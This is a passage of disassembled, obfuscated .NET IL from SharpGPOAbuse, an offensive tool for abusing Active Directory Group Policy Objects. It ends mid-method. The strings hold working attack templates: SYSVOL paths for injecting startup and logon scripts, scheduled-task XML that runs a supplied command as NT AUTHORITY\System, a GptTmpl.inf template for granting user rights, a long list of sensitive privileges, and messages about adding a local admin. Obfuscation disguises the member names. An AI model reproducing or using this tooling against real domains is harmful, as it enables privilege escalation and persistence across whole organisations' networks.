  IL_0618:  ldstr      "\\\\"
  IL_061d:  stsfld     string FlagsAttribute
  IL_0622:  ldstr      "\\SysVol\\"
  IL_0627:  stsfld     string FormatException
  IL_062c:  ldstr      "\\Policies\\"
  IL_0631:  stsfld     string GCCollectionMode
  IL_0636:  ldstr      "Computer"
  IL_063b:  stsfld     string GCNotificationStatus
  IL_0640:  ldstr      "[Startup]"
  IL_0645:  stsfld     string GC
  IL_064a:  ldstr      "0CmdLine="
  IL_064f:  stsfld     string Guid
  IL_0654:  ldstr      "0Parameters="
  IL_0659:  stsfld     string IAsyncResult
  IL_065e:  ldstr      "[Logon]"
  IL_0663:  stsfld     string ICustomFormatter
  IL_0668:  ldstr      "0CmdLine="
  IL_066d:  stsfld     string IFormatProvider
  IL_0672:  ldstr      "0Parameters="
  IL_0677:  stsfld     string IndexOutOfRangeException
  IL_067c:  ldstr      "\\GPT.ini"
  IL_0681:  stsfld     string InsufficientMemoryException
  IL_0686:  ldstr      "Computer"
  IL_068b:  stsfld     string Int16
  IL_0690:  ldstr      "\\Machine\\Scripts\\Startup\\"
  IL_0695:  stsfld     string Int32
  IL_069a:  ldstr      "\\Machine\\Scripts\\scripts.ini"
  IL_069f:  stsfld     string Int64
  IL_06a4:  ldstr      "User"
  IL_06a9:  stsfld     string IntPtr
  IL_06ae:  ldstr      "\\User\\Scripts\\Logon\\"
  IL_06b3:  stsfld     string Internal
  IL_06b8:  ldstr      "\\User\\Scripts\\scripts.ini"
  IL_06bd:  stsfld     string InvalidCastException
  IL_06c2:  ldstr      "[!] Could not find the specified GPO!\nExiting..."
  IL_06c7:  stsfld     string InvalidOperationException
  IL_06cc:  ldstr      "[!] A Startup script with the same name already ex"
  + "ists. Choose a different name.\n[-] Exiting...\n"
  IL_06d1:  stsfld     string InvalidProgramException
  IL_06d6:  ldstr      ""
  IL_06db:  stsfld     string IServiceProvider
  IL_06e0:  ldstr      "[^0-9]"
  IL_06e5:  stsfld     string LocalDataStore
  IL_06ea:  ldstr      ""
  IL_06ef:  stsfld     string LdsSyncHelper
  IL_06f4:  ldstr      "CmdLine="
  IL_06f9:  stsfld     string LocalDataStoreSlot
  IL_06fe:  ldstr      "Parameters="
  IL_0703:  stsfld     string LocalDataStoreMgr
  IL_0708:  ldstr      "[+] Creating new startup script..."
  IL_070d:  stsfld     string Math
  IL_0712:  ldstr      "Computer"
  IL_0717:  stsfld     string Mda
  IL_071c:  ldstr      "NewStartupScript"
  IL_0721:  stsfld     string MethodAccessException
  IL_0726:  ldstr      "Computer"
  IL_072b:  stsfld     string MidpointRounding
  IL_0730:  ldstr      "NewStartupScript"
  IL_0735:  stsfld     string MissingMemberException
  IL_073a:  ldstr      "User"
  IL_073f:  stsfld     string MissingFieldException
  IL_0744:  ldstr      "<\?xml version=\"1.0\" encoding=\"utf-8\"\?><ScheduledTa"
  + "sks clsid=\"{CC63F200-7309-4ba0-B154-A71CD118DBCC}\">"
  IL_0749:  stsfld     string MissingMethodException
  IL_074e:  ldstr      "</ScheduledTasks>"
  IL_0753:  stsfld     string MulticastNotSupportedException
  IL_0758:  ldstr      "Computer"
  IL_075d:  stsfld     string NonSerializedAttribute
  IL_0762:  ldstr      "<ImmediateTaskV2 clsid=\"{{9756B581-76EC-4169-9AFC-"
  + "0CA8D43ADB5F}}\" name=\"{1}\" image=\"0\" changed=\"2019-03-30 23:04:20\" uid="
  + "\"{4}\"><Properties action=\"C\" name=\"{1}\" runAs=\"NT AUTHORITY\\System\" log"
  + "onType=\"S4U\"><Task version=\"1.3\"><RegistrationInfo><Author>{0}</Author>"
  + "<Description></Description></RegistrationInfo><Principals><Principal id"
  + "=\"Author\"><UserId>NT AUTHORITY\\System</UserId><LogonType>S4U</LogonType"
  + "><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Setting"
  + "s><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeou"
  + "t><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdl"
  + "e></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesP"
  + "olicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><Sto"
  + "pIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>tr"
  + "ue</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><Ru"
  + "nOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnD"
  + "emand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hi"
  + "dden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><E"
  + "xecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><Delete"
  + "ExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><Tim"
  + "eTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%L"
  + "ocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Trig"
  + "gers><Actions Context=\"Author\"><Exec><Command>{2}</Command><Arguments>{"
  + "3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>"
  IL_0767:  stsfld     string NotFiniteNumberException
  IL_076c:  ldstr      "<ImmediateTaskV2 clsid=\"{{9756B581-76EC-4169-9AFC-"
  + "0CA8D43ADB5F}}\" name=\"{1}\" image=\"0\" changed=\"2019-07-25 14:05:31\" uid="
  + "\"{4}\"><Properties action=\"C\" name=\"{1}\" runAs=\"%LogonDomain%\\%LogonUser"
  + "%\" logonType=\"InteractiveToken\"><Task version=\"1.3\"><RegistrationInfo><"
  + "Author>{0}</Author><Description></Description></RegistrationInfo><Princ"
  + "ipals><Principal id=\"Author\"><UserId>%LogonDomain%\\%LogonUser%</UserId>"
  + "<LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunL"
  + "evel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</"
  + "Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdle"
  + "End><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstanc"
  + "esPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries"
  + ">true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfG"
  + "oingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhen"
  + "Available>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</Ru"
  + "nOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><E"
  + "nabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnl"
  + "yIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionT"
  + "imeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpi"
  + "redTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTim"
  + "eXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enab"
  + "led>true</Enabled></TimeTrigger></Triggers><Actions Context=\"Author\"><E"
  + "xec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></"
  + "Task></Properties></ImmediateTaskV2>"
  IL_0771:  stsfld     string NotImplementedException
  IL_0776:  ldstr      "\\\\"
  IL_077b:  stsfld     string NotSupportedException
  IL_0780:  ldstr      "\\SysVol\\"
  IL_0785:  stsfld     string NullReferenceException
  IL_078a:  ldstr      "\\Policies\\"
  IL_078f:  stsfld     string Number
  IL_0794:  ldstr      "\\GPT.ini"
  IL_0799:  stsfld     string ObjectDisposedException
  IL_079e:  ldstr      "Computer"
  IL_07a3:  stsfld     string ObsoleteAttribute
  IL_07a8:  ldstr      "\\Machine\\Preferences\\ScheduledTasks\\"
  IL_07ad:  stsfld     string OleAutBinder
  IL_07b2:  ldstr      "User"
  IL_07b7:  stsfld     string OperatingSystem
  IL_07bc:  ldstr      "\\User\\Preferences\\ScheduledTasks\\"
  IL_07c1:  stsfld     string OperationCanceledException
  IL_07c6:  ldstr      "[!] Could not find the specified GPO!\nExiting..."
  IL_07cb:  stsfld     string OverflowException
  IL_07d0:  ldstr      "ScheduledTasks.xml"
  IL_07d5:  stsfld     string ParamArrayAttribute
  IL_07da:  ldstr      "[+] Modifying "
  IL_07df:  stsfld     string ParseNumbers
  IL_07e4:  ldstr      " "
  IL_07e9:  stsfld     string PlatformID
  IL_07ee:  ldstr      ""
  IL_07f3:  stsfld     string PlatformNotSupportedException
  IL_07f8:  ldstr      "</ScheduledTasks>"
  IL_07fd:  stsfld     string Random
  IL_0802:  ldstr      "Computer"
  IL_0807:  stsfld     string RankException
  IL_080c:  ldstr      "NewImmediateTask"
  IL_0811:  stsfld     string ResId
  IL_0816:  ldstr      "Computer"
  IL_081b:  stsfld     string CtorDelegate
  IL_0820:  ldstr      "NewImmediateTask"
  IL_0825:  stsfld     string ICustomAttributeProvider
  IL_082a:  ldstr      "User"
  IL_082f:  stsfld     string _MemberInfo
  IL_0834:  ldstr      "[!] The GPO already includes a ScheduledTasks.xml."
  + " Use --Force to append to ScheduledTasks.xml or choose another GPO.\n[-]"
  + " Exiting...\n"
  IL_0839:  stsfld     string MemberInfo
  IL_083e:  ldstr      "[+] Creating file "
  IL_0843:  stsfld     string _Type
  IL_0848:  ldstr      "Computer"
  IL_084d:  stsfld     string IReflect
  IL_0852:  ldstr      "NewImmediateTask"
  IL_0857:  stsfld     string Type
  IL_085c:  ldstr      "Computer"
  IL_0861:  stsfld     string RuntimeType
  IL_0866:  ldstr      "NewImmediateTask"
  IL_086b:  stsfld     string ReflectionOnlyType
  IL_0870:  ldstr      "User"
  IL_0875:  stsfld     string CerArrayList`1
  IL_087a:  ldstr      "[+] SID Value of "
  IL_087f:  stsfld     string CerHashtable`2
  IL_0884:  ldstr      " = "
  IL_0889:  stsfld     string Utf8String
  IL_088e:  ldstr      "[-] Could not find user \""
  IL_0893:  stsfld     string ASSERT
  IL_0898:  ldstr      "\" in the "
  IL_089d:  stsfld     string LOGIC
  IL_08a2:  ldstr      " domain.\n[-] Exiting...\n"
  IL_08a7:  stsfld     string RuntimeArgumentHandle
  IL_08ac:  ldstr      "[Unicode]\r\nUnicode=yes\r\n[Version]\r\nsignature=\"$CHI"
  + "CAGO$\"\r\nRevision = 1\r\n[Privilege Rights]"
  IL_08b1:  stsfld     string RuntimeTypeHandle
  IL_08b6:  ldstr      " = *"
  IL_08bb:  stsfld     string RuntimeMethodHandle
  IL_08c0:  ldstr      " = *"
  IL_08c5:  stsfld     string RuntimeFieldHandle
  IL_08ca:  ldstr      "\\\\"
  IL_08cf:  stsfld     string AssemblyHandle
  IL_08d4:  ldstr      "\\SysVol\\"
  IL_08d9:  stsfld     string ModuleHandle
  IL_08de:  ldstr      "\\Policies\\"
  IL_08e3:  stsfld     string Signature
  IL_08e8:  ldstr      "\\GPT.ini"
  IL_08ed:  stsfld     string SignatureStruct
  IL_08f2:  ldstr      "\\Machine\\Microsoft\\Windows NT\\SecEdit\\"
  IL_08f7:  stsfld     string Resolver
  IL_08fc:  ldstr      "[!] Could not find the specified GPO!\nExiting..."
  IL_0901:  stsfld     string SByte
  IL_0906:  ldstr      "GptTmpl.inf"
  IL_090b:  stsfld     string SerializableAttribute
  IL_0910:  ldstr      "[+] File exists: "
  IL_0915:  stsfld     string SharedStatics
  IL_091a:  ldstr      "[Privilege Rights]"
  IL_091f:  stsfld     string Single
  IL_0924:  ldstr      "[!] The GPO already specifies user rights. Select "
  + "a different attack.\n[!] Exiting..."
  IL_0929:  stsfld     string TimeoutException
  IL_092e:  ldstr      "[+] The GPO does not specify any user rights. Addi"
  + "ng new rights..."
  IL_0933:  stsfld     string TimeSpan
  IL_0938:  ldstr      "[Privilege Rights]"
  IL_093d:  stsfld     string TypeCode
  IL_0942:  ldstr      "AddNewRights"
  IL_0947:  stsfld     string TypedReference
  IL_094c:  ldstr      "Computer"
  IL_0951:  stsfld     string TypeInitializationException
  IL_0956:  ldstr      "[+] Creating file "
  IL_095b:  stsfld     string UInt16
  IL_0960:  ldstr      "AddNewRights"
  IL_0965:  stsfld     string UInt32
  IL_096a:  ldstr      "Computer"
  IL_096f:  stsfld     string UInt64
  IL_0974:  ldstr      "SeTrustedCredManAccessPrivilege"
  IL_0979:  stsfld     string UIntPtr
  IL_097e:  ldstr      "SeNetworkLogonRight"
  IL_0983:  stsfld     string UnauthorizedAccessException
  IL_0988:  ldstr      "SeTcbPrivilege"
  IL_098d:  stsfld     string UnitySerializationHolder
  IL_0992:  ldstr      "SeMachineAccountPrivilege"
  IL_0997:  stsfld     string UnhandledExceptionEventArgs
  IL_099c:  ldstr      "SeIncreaseQuotaPrivilege"
  IL_09a1:  stsfld     string UnhandledExceptionEventHandler
  IL_09a6:  ldstr      "SeInteractiveLogonRight"
  IL_09ab:  stsfld     string UnSafeCharBuffer
  IL_09b0:  ldstr      "SeRemoteInteractiveLogonRight"
  IL_09b5:  stsfld     string Variant
  IL_09ba:  ldstr      "SeBackupPrivilege"
  IL_09bf:  stsfld     string Version
  IL_09c4:  ldstr      "SeChangeNotifyPrivilege"
  IL_09c9:  stsfld     string Void
  IL_09ce:  ldstr      "SeSystemtimePrivilege"
  IL_09d3:  stsfld     string WeakReference
  IL_09d8:  ldstr      "SeTimeZonePrivilege"
  IL_09dd:  stsfld     string XmlIgnoreMemberAttribute
  IL_09e2:  ldstr      "SeCreatePagefilePrivilege"
  IL_09e7:  stsfld     string AbandonedMutexException
  IL_09ec:  ldstr      "SeCreateTokenPrivilege"
  IL_09f1:  stsfld     string WaitHandle
  IL_09f6:  ldstr      "SeCreateGlobalPrivilege"
  IL_09fb:  stsfld     string EventWaitHandle
  IL_0a00:  ldstr      "SeCreatePermanentPrivilege"
  IL_0a05:  stsfld     string AutoResetEvent
  IL_0a0a:  ldstr      "SeCreateSymbolicLinkPrivilege"
  IL_0a0f:  stsfld     string SynchronizationContextSwitcher
  IL_0a14:  ldstr      "SeDebugPrivilege"
  IL_0a19:  stsfld     string SendOrPostCallback
  IL_0a1e:  ldstr      "SeDenyNetworkLogonRight"
  IL_0a23:  stsfld     string SynchronizationContextProperties
  IL_0a28:  ldstr      "SeDenyBatchLogonRight"
  IL_0a2d:  stsfld     string SynchronizationContext
  IL_0a32:  ldstr      "SeDenyServiceLogonRight"
  IL_0a37:  stsfld     string CompressedStackSwitcher
  IL_0a3c:  ldstr      "SeDenyInteractiveLogonRight"
  IL_0a41:  stsfld     string SafeHandle
  IL_0a46:  ldstr      "SeDenyRemoteInteractiveLogonRight"
  IL_0a4b:  stsfld     string SafeCompressedStackHandle
  IL_0a50:  ldstr      "SeEnableDelegationPrivilege"
  IL_0a55:  stsfld     string CompressedStack
  IL_0a5a:  ldstr      "SeRemoteShutdownPrivilege"
  IL_0a5f:  stsfld     string DomainCompressedStack
  IL_0a64:  ldstr      "SeAuditPrivilege"
  IL_0a69:  stsfld     string EventResetMode
  IL_0a6e:  ldstr      "SeImpersonatePrivilege"
  IL_0a73:  stsfld     string ExceptionType
  IL_0a78:  ldstr      "SeIncreaseWorkingSetPrivilege"
  IL_0a7d:  stsfld     string WaitDelegate
  IL_0a82:  ldstr      "SeIncreaseBasePriorityPrivilege"
  IL_0a87:  stsfld     string ExecutionContextSwitcher
  IL_0a8c:  ldstr      "SeLoadDriverPrivilege"
  IL_0a91:  stsfld     string AsyncFlowControl
  IL_0a96:  ldstr      "SeLockMemoryPrivilege"
  IL_0a9b:  stsfld     string ContextCallback
  IL_0aa0:  ldstr      "SeBatchLogonRight"
  IL_0aa5:  stsfld     string ExecutionContext
  IL_0aaa:  ldstr      "SeServiceLogonRight"
  IL_0aaf:  stsfld     string Interlocked
  IL_0ab4:  ldstr      "SeSecurityPrivilege"
  IL_0ab9:  stsfld     string IObjectHandle
  IL_0abe:  ldstr      "SeRelabelPrivilege"
  IL_0ac3:  stsfld     string HostExecutionContextSwitcher
  IL_0ac8:  ldstr      "SeSystemEnvironmentPrivilege"
  IL_0acd:  stsfld     string HostExecutionContext
  IL_0ad2:  ldstr      "SeManageVolumePrivilege"
  IL_0ad7:  stsfld     string IUnknownSafeHandle
  IL_0adc:  ldstr      "SeProfileSingleProcessPrivilege"
  IL_0ae1:  stsfld     string HostExecutionContextManager
  IL_0ae6:  ldstr      "SeSystemProfilePrivilege"
  IL_0aeb:  stsfld     string LockCookie
  IL_0af0:  ldstr      "SeUndockPrivilege"
  IL_0af5:  stsfld     string ManualResetEvent
  IL_0afa:  ldstr      "SeAssignPrimaryTokenPrivilege"
  IL_0aff:  stsfld     string Monitor
  IL_0b04:  ldstr      "SeRestorePrivilege"
  IL_0b09:  stsfld     string Mutex
  IL_0b0e:  ldstr      "SeShutdownPrivilege"
  IL_0b13:  stsfld     string NativeOverlapped
  IL_0b18:  ldstr      "SeSyncAgentPrivilege"
  IL_0b1d:  stsfld     string _IOCompletionCallback
  IL_0b22:  ldstr      "SeTakeOwnershipPrivilege"
  IL_0b27:  stsfld     string OverlappedData
  IL_0b2c:  ldstr      ""
  IL_0b31:  stsfld     string Overlapped
  IL_0b36:  ldstr      ""
  IL_0b3b:  stsfld     string OverlappedDataCacheLine
  IL_0b40:  ldstr      ""
  IL_0b45:  stsfld     string OverlappedDataCache
  IL_0b4a:  ldstr      ""
  IL_0b4f:  stsfld     string ParameterizedThreadStart
  IL_0b54:  ldstr      ""
  IL_0b59:  stsfld     string ReaderWriterLock
  IL_0b5e:  ldstr      ""
  IL_0b63:  stsfld     string SynchronizationLockException
  IL_0b68:  ldstr      ""
  IL_0b6d:  stsfld     string InternalCrossContextDelegate
  IL_0b72:  ldstr      ""
  IL_0b77:  stsfld     string ThreadHelper
  IL_0b7c:  ldstr      ""
  IL_0b81:  stsfld     string Thread
  IL_0b86:  ldstr      ""
  IL_0b8b:  stsfld     string StackCrawlMark
  IL_0b90:  ldstr      "[!] You can only specify one attack at a time.\n[-]"
  + " Exiting\n"
  IL_0b95:  stsfld     string ThreadAbortException
  IL_0b9a:  ldstr      "[!] You need to provide the name of the GPO to edi"
  + "t.\n[!] Exiting...\n"
  IL_0b9f:  stsfld     string ThreadInterruptedException
  IL_0ba4:  ldstr      "[!] To add a new local admin the following options"
  + " are needed:\n\t--UserAccount\n\n[-] Exiting..."
  IL_0ba9:  stsfld     string ThreadPoolGlobals
  IL_0bae:  ldstr      "[!] To add a new startup script the following opti"
  + "ons are needed:\n\t--ScriptName\n\t--ScriptContents\n\n[-] Exiting..."
  IL_0bb3:  stsfld     string ThreadPoolRequestQueue
  IL_0bb8:  ldstr      "[!] To add a new startup script the following opti"
  + "ons are needed:\n\t--ScriptName\n\t--ScriptContents\n\n[-] Exiting..."
  IL_0bbd:  stsfld     string RegisteredWaitHandleSafe
  IL_0bc2:  ldstr      "[!] To add a new immediate task the following opti"
  + "ons are needed:\n\t--Author\n\t--TaskName\n\t--Arguments\n\t--Command\n\n[-] Exit"
  + "ing..."
  IL_0bc7:  stsfld     string RegisteredWaitHandle
  IL_0bcc:  ldstr      "[!] To add user rights the following options are n"
  + "eeded:\n\t--UserAccount\n\t--UserRights\n[-] Exiting..."
  IL_0bd1:  stsfld     string WaitCallback
  IL_0bd6:  ldstr      "\n[!] The user rights provided were not valid. Righ"
  + "ts are case sensitive!\n[!] Exiting..."
  IL_0bdb:  stsfld     string WaitOrTimerCallback
  IL_0be0:  ldstr      "[!] Unknown argument error.\n[!] Exiting...\n"
  IL_0be5:  stsfld     string _ThreadPoolWaitCallback
  IL_0bea:  ldstr      "[!] Cannot enumerate domain.\n"
  IL_0bef:  stsfld     string _ThreadPoolWaitOrTimerCallback
  IL_0bf4:  ldstr      "CN=Policies,CN=System"
  IL_0bf9:  stsfld     string IOCompletionCallback
  IL_0bfe:  ldstr      ",DC="
  IL_0c03:  stsfld     string ThreadPool
  IL_0c08:  ldstr      "[+] Domain = "
  IL_0c0d:  stsfld     string ThreadPriority
  IL_0c12:  ldstr      "[+] Domain Controller = "
  IL_0c17:  stsfld     string ThreadStart
  IL_0c1c:  ldstr      "[+] Distinguished Name = "
  IL_0c21:  stsfld     string ThreadState
  IL_0c26:  ldstr      "[!] Exiting..."
  IL_0c2b:  stsfld     string ThreadStateException
  IL_0c30:  ldstr      "User"
  IL_0c35:  stsfld     string ThreadStaticAttribute
  IL_0c3a:  ldstr      "Computer"
  IL_0c3f:  stsfld     string ThreadStartException
  IL_0c44:  ldstr      "User"
  IL_0c49:  stsfld     string Timeout
  IL_0c4e:  ldstr      "Computer"
  IL_0c53:  stsfld     string _TimerCallback
  IL_0c58:  ret
} // end of global method .cctor

.method public hidebysig static int32  '<Module>'(int32 A_0) cil managed
{
  // Code size       62 (0x3e)
  .maxstack  2
  .locals init ([0] bool V_0,
           [1] bool V_1,
           [2] int32 V_2)
  IL_0000:  nop
  IL_0001:  br         IL_002a

  IL_0006:  nop
  IL_0007:  ldarg.0
  IL_0008:  ldc.i4.2
  IL_0009:  rem
  IL_000a:  ldc.i4.0
  IL_000b:  ceq
  IL_000d:  stloc.0
  IL_000e:  ldloc.0
  IL_000f:  brfalse    IL_0020

  IL_0014:  nop
  IL_0015:  ldarg.0
  IL_0016:  ldc.i4.2
  IL_0017:  div
  IL_0018:  starg.s    A_0
  IL_001a:  nop
  IL_001b:  br         IL_0029

  IL_0020:  nop
  IL_0021:  ldc.i4.3
  IL_0022:  ldarg.0
  IL_0023:  mul
  IL_0024:  ldc.i4.1
  IL_0025:  add
  IL_0026:  starg.s    A_0
  IL_0028:  nop
  IL_0029:  nop
  IL_002a:  ldarg.0
  IL_002b:  ldc.i4.1
  IL_002c:  ceq
  IL_002e:  ldc.i4.0
  IL_002f:  ceq
  IL_0031:  stloc.1
  IL_0032:  ldloc.1
  IL_0033:  brtrue.s   IL_0006

  IL_0035:  ldarg.0
  IL_0036:  stloc.2
  IL_0037:  br         IL_003c

  IL_003c:  ldloc.2
  IL_003d:  ret
} // end of global method '<Module>'


// =============================================================


// =============== CLASS MEMBERS DECLARATION ===================

.class public auto ansi beforefieldinit SharpGPOAbuse.TimerCallback
       extends [mscorlib]System.Object
{
  .field private string IEnumSTORE_DEPLOYMENT_METADATA_PROPERTY
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private string StoreDeploymentMetadataPropertyEnumeration
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private string IEnumSTORE_ASSEMBLY
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private string StoreAssemblyEnumeration
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private string IEnumSTORE_ASSEMBLY_FILE
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private string StoreAssemblyFileEnumeration
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private string IEnumSTORE_CATEGORY
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private string StoreCategoryEnumeration
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private bool IEnumSTORE_CATEGORY_SUBCATEGORY
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private bool StoreSubcategoryEnumeration
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private bool IEnumSTORE_CATEGORY_INSTANCE
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private bool StoreCategoryInstanceEnumeration
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private string IReferenceIdentity
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private bool IDefinitionIdentity
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private bool IEnumIDENTITY_ATTRIBUTE
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private bool IEnumDefinitionIdentity
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private string IEnumReferenceIdentity
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private string IDefinitionAppId
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private bool IReferenceAppId
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public hidebysig specialname instance string 
          TimerBase() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x5388389c
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x21d6400a
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      string SharpGPOAbuse.TimerCallback::IEnumSTORE_DEPLOYMENT_METADATA_PROPERTY
    IL_0024:  ret
  } // end of method TimerCallback::TimerBase

  .method public hidebysig specialname instance void 
          WaitHandleCannotBeOpenedException(string STAThreadAttribute) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      string SharpGPOAbuse.TimerCallback::IEnumSTORE_DEPLOYMENT_METADATA_PROPERTY
    IL_0007:  ret
  } // end of method TimerCallback::WaitHandleCannotBeOpenedException

  .method public hidebysig specialname instance string 
          MTAThreadAttribute() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x191ce066
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x236e3638
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      string SharpGPOAbuse.TimerCallback::StoreDeploymentMetadataPropertyEnumeration
    IL_0024:  ret
  } // end of method TimerCallback::MTAThreadAttribute

  .method public hidebysig specialname instance void 
          ISectionWithStringKey(string ISectionEntry) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      string SharpGPOAbuse.TimerCallback::StoreDeploymentMetadataPropertyEnumeration
    IL_0007:  ret
  } // end of method TimerCallback::ISectionWithStringKey

  .method public hidebysig specialname instance string 
          IEnumUnknown() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x27c5b1e9
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x78267c38
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      string SharpGPOAbuse.TimerCallback::IEnumSTORE_ASSEMBLY
    IL_0024:  ret
  } // end of method TimerCallback::IEnumUnknown

  .method public hidebysig specialname instance void 
          CMSSECTIONID(string CMS_ASSEMBLY_REFERENCE_FLAG) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      string SharpGPOAbuse.TimerCallback::IEnumSTORE_ASSEMBLY
    IL_0007:  ret
  } // end of method TimerCallback::CMSSECTIONID

  .method public hidebysig specialname instance string 
          CMS_ASSEMBLY_REFERENCE_DEPENDENT_ASSEMBLY_FLAG() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x5d70afa3
    IL_0005:  stloc.0
